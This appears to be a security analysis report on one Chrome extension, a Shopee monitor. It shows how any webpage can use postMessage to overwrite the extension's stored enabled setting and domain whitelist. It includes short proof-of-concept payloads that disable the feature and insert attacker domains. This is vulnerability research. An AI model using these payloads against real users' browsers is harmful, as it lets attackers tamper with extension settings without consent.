# CoCo Analysis: cooolmeendmbjakdmimlcjjefohdcbge

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: cs_window_eventListener_message → chrome_storage_local_set_sink (isEnabled)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cooolmeendmbjakdmimlcjjefohdcbge/opgen_generated_files/cs_0.js
Line 469    window.addEventListener('message', e => {
Line 470    if (!e.data) {
Line 470    if (!e.data) {
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cooolmeendmbjakdmimlcjjefohdcbge/opgen_generated_files/bg.js
Line 1040   isEnabled: req.isEnabled,
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener('message', e => {
  if (!e.data) {
    return;
  }

  switch (e.data.type) { // <- attacker-controlled
    case 'shopeeMonitor-init':
      chrome.runtime.sendMessage(e.data, function(response) { // <- attacker-controlled e.data
        if (response.isInWhiteList) {
          shopeeMonitor.init();
        }
      });
      break;
    case 'shopeeMonitor-data':
      shopeeMonitor.handlerPageMessage(e.data.message);
      break;
    default:
      return;
  }
});

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  chrome.storage.local.get(['isEnabled', 'whiteList'], function(result) {
    let isEnabled = result.isEnabled === false ? false : true;
    let whiteList = result.whiteList || defaultWhiteList;

    switch (req.type) { // <- attacker-controlled via content script
      case 'shopeeMonitor-init':
        ports[sender.tab.id]._connected = true;
        if (isEnabled && isInWhiteList(whiteList, req.host)) {
          sendResponse({isInWhiteList: true});
          chrome.browserAction.setIcon({
            tabId: sender.tab.id,
            path: 'icons/icon.png'
          });
        } else {
          sendResponse({isInWhiteList: false});
        }
        break;
      case 'shopeeMonitorPopup-init':
        chrome.tabs.query({active: true, currentWindow: true}, function(tab) {
          let isConnected = ports[tab[0].id] && ports[tab[0].id]._connected || false;
          sendResponse({isEnabled: isEnabled, isConnected: isConnected, whiteList: whiteList});
        });
        break;
      case 'shopeeMonitorPopup-toggleEnable':
        for (let id in ports) {
          chrome.tabs.sendMessage(parseInt(id), {
            type: 'shopeeMonitorPage-toggleEnable',
            isEnabled: req.isEnabled, // <- attacker-controlled
            whiteList: whiteList
          });
          chrome.browserAction.setIcon({
            tabId: parseInt(id),
            path: req.isEnabled ? 'icons/icon.png' : 'icons/icon-gray.png'
          });
        }
        chrome.storage.local.set({isEnabled: req.isEnabled}); // <- SINK: attacker-controlled data
        break;
      case 'shopeeMonitorPopup-saveWhiteList':
        chrome.storage.local.set({whiteList: req.whiteList}); // <- SINK: attacker-controlled data
        break;
      default:
        return true;
    }
  });

  return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (cs_window_eventListener_message)

**Attack:**

```javascript
// Malicious webpage sends message to content script
window.postMessage({
  type: 'shopeeMonitorPopup-toggleEnable',
  isEnabled: false  // Disable the monitoring feature
}, '*');

// Or poison the whitelist
window.postMessage({
  type: 'shopeeMonitorPopup-saveWhiteList',
  whiteList: ['attacker.com', 'evil.com']  // Replace whitelist with attacker domains
}, '*');
```

**Impact:** An attacker on any webpage can control the extension's settings by sending postMessage events to the content script. The content script forwards these messages to the background script without validation, allowing the attacker to: (1) disable/enable the monitoring feature via `isEnabled` setting, and (2) manipulate the whitelist of allowed domains. While this is storage poisoning without a complete retrieval path shown in the traces, the attacker can observe the effects through the extension's behavior (icon changes, monitoring activation).

---

## Sink 2: cs_window_eventListener_message → chrome_storage_local_set_sink (whiteList)

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cooolmeendmbjakdmimlcjjefohdcbge/opgen_generated_files/cs_0.js
Line 469    window.addEventListener('message', e => {
Line 470    if (!e.data) {
Line 470    if (!e.data) {
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/cooolmeendmbjakdmimlcjjefohdcbge/opgen_generated_files/bg.js
Line 1051   chrome.storage.local.set({whiteList: req.whiteList});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (cs_window_eventListener_message)

**Attack:**

```javascript
// Malicious webpage manipulates the whitelist
window.postMessage({
  type: 'shopeeMonitorPopup-saveWhiteList',
  whiteList: ['*.attacker.com', '*']  // Allow attacker domains or all domains
}, '*');
```

**Impact:** Same as Sink 1 - attacker can manipulate the whitelist that controls which domains are monitored by the extension. This allows the attacker to add malicious domains to the whitelist or remove legitimate ones, effectively controlling the extension's domain filtering behavior.
